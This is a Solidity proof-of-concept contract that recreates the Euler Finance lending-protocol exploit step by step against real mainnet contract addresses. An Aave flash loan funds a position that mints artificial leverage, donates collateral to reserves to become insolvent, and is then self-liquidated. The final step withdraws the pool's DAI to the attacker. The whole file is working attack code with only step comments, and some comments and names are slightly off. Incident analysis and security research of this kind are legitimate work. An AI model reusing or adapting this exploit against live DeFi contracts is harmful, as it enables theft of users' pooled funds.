// SPDX-License-Identifier: UNLICENSED
// TODO update sol version
pragma solidity ^0.8.4;

import {Test, console2} from "forge-std/Test.sol";
import {IPool} from "@aave/v3/interfaces/IPool.sol";
import {FlashLoanSimpleReceiverBase} from "@aave/v3/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";
import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
import {EToken} from "euler-contracts/modules/EToken.sol";
import {DToken} from "euler-contracts/modules/DToken.sol";
import {Euler} from "euler-contracts/Euler.sol";
import {Liquidation} from "euler-contracts/modules/Liquidation.sol";

error NotEnoughFunds(uint256 balance, uint256 amount);

library EulerAddresses {
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant eDAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
    address constant dDAI = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;
}

contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {

    Violator private violator;

     constructor(
        IPoolAddressesProvider _addressProvider,
        address _collateral
    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider)) {
         violator = new Violator();
     }

    // 1. Flahsloan from AaveV2
    function callFashLoan(address _tokenAddress, uint256 _amount) external {
       POOL.flashLoanSimple(address(this), _tokenAddress, _amount, "0x", 0);
    }

    // flashLoanSimple callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    )
        external
        returns (bool)
    {

        IERC20 token = IERC20(asset);
        // 2. Transfer the full loan balance to the violator
        token.transfer(address(violator), amount);

        // Start the attack using 2/3 of the funds
        uint256 attackAmount = (amount / 3) * 2;

        // Call violator and execute attack
        violator.executeAttack(token, attackAmount);

        // Check balance
        uint256 balance = token.balanceOf(address(this));
        uint256 repayAmount = amount + premium;

        if(balance < repayAmount) {
            revert NotEnoughFunds({
                balance: balance,
                amount: repayAmount
            });
        }

        // Approve the LendingPool contract allowance to pull the owed amount
        uint amountOwing = amount + premium;
        token.approve(address(POOL), amountOwing);

        return true;
    }

    receive() external payable {}

}

contract Violator {
    Liquidator private liquidator;

    constructor() {
        liquidator = new Liquidator();
    }

    function executeAttack( IERC20 _token, uint256 _amount) external {
        _token.approve(EulerAddresses.EULER, type(uint256).max);

        // Check balance
        uint256 balance = _token.balanceOf(address(this));

        // minBalance = 1.5 * _amount since amount is 2/3 of the flashloan
        uint256 minBalance = (_amount * 3) / 2;

        if(balance < minBalance) {
            revert NotEnoughFunds({
                balance: balance,
                amount: minBalance
            });
        }


        EToken eToken = EToken(EulerAddresses.eDAI);

        // 3. Deposit _amount to the EToken of Euler Finance
        eToken.deposit(0, _amount);

        // 4. Create a 10x artificial EToken leverage
        uint256 amountLeveraged = _amount * 10;
        eToken.mint(0, amountLeveraged);

        DToken dToken = DToken(EulerAddresses.dDAI);
        // 5. Repay _amount / 2 _token on the violator’s position, causing their DToken balance to decrease
        dToken.repay(0, _amount / 2);

        // 6. Create another 10x artificial EToken leverage
        eToken.mint(0, amountLeveraged);

        // 7. Donate half of EToken (leveraged) balance to the reserve of the EToken
        eToken.donateToReserves(0, amountLeveraged / 2);

        uint256 eTokenBalance = eToken.balanceOfUnderlying(address(this));
        uint256 dTokenBalance = dToken.balanceOf(address(this));

        // violator contains a significantly larger amount of DToken than EToken that will never be collateralized
        assert(dTokenBalance > eTokenBalance);

        // 8. Liquidate the violator’s position
        return liquidator.executeLiquidation(msg.sender, _token, address(this));
    }
}


contract Liquidator {
    Liquidation public constant liquidation = Liquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);

    function executeLiquidation(address _attacker, IERC20 _token, address _violator) external {
        Liquidation.LiquidationOpportunity memory liq =  liquidation.checkLiquidation(address(this), _violator, address(_token), address(_token));
        liquidation.liquidate(_violator, address(_token), address(_token), liq.repay, liq.yield-1);

        EToken(EulerAddresses.eDAI).withdraw(0, _token.balanceOf(EulerAddresses.EULER));
        _token.transfer(_attacker, _token.balanceOf(address(this)));
    }


}
